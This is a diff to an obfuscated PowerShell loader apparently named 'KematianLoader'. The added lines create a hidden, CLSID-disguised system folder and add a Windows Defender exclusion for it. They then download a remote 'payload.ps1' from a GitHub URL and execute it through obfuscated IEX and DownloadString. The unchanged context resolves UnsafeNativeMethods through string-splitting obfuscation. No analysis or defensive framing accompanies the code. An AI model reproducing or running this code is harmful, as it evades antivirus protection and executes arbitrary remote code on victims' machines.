@@ -1,4 +1,15 @@
 $ProgressPreference = ('Sil'+'ent'+'l'+'yContinu'+'e')
+
+$rdir = "C:\Users\Loader"
+$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+New-Item -ItemType Directory -Path $dir
+attrib +h +s $dir
+Add-MpPreference -ExclusionPath $dir
+
+$shellcode = ("https://github.com/43a1723/test/raw/main/Extras/hacklife/payload.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
+
 function KematianLoader {
     Param ($kematian_modules, $kematian_func)
     $assem = ([AppDomain]::"cU`R`Re`NTdOMaIn".(('GE'+'T')+('as'+'S')+('EmBLIe'+'S')).Invoke() | ? { $_."GlO`BaLasS`eMBLY`C`AchE" -and $_."lo`Ca`TIoN".('sp'+('L'+'It')).Invoke((('qw'+'IqwI').rEplAcE(([chAr]113+[chAr]119+[chAr]73),[sTriNG][chAr]92)))[-1].('Eq'+('u'+'al')+'S').Invoke(('Syst'+'e'+'m.dll')) }).(('g'+'ET')+'Ty'+'Pe').Invoke(('M'+'icrosoft.Win3'+'2.Uns'+'afeNa'+'tive'+'Metho'+'ds'))
